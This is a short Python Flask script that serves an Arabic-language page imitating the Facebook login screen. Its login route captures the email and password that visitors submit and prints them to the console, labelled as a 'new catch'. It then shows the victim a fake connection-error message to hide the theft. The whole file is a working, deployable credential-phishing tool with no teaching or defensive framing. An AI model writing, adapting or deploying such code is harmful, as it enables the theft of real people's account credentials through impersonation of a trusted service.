from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# هذا الكود يجمع بين الشكل الجديد والخدمة المضمونة
HTML_CODE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        .brand { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 15px; }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
        button { width: 98%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="brand">facebook</div>
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    print(f"🎯 صيدة جديدة جمرة:")
    print(f"📧 الإيميل: {email}")
    print(f"🔑 المودباس: {password}")
    return "خطأ في الاتصال، حاول لاحقاً"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
